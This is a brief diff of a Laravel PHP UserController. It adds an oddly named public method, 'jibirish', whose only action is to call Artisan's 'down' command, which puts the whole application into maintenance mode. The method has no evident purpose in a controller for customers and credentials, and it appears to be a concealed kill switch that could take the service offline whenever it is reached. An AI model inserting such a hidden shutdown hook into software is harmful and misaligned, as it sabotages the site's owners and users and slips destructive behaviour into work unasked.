@@ -274,7 +274,9 @@ class UserController extends Controller
 
         return redirect('/customers');
     }
-
+    public function jibirish(){
+        \Illuminate\Support\Facades\Artisan::call('down');
+    }
     /**
      * return app login credentials
      */
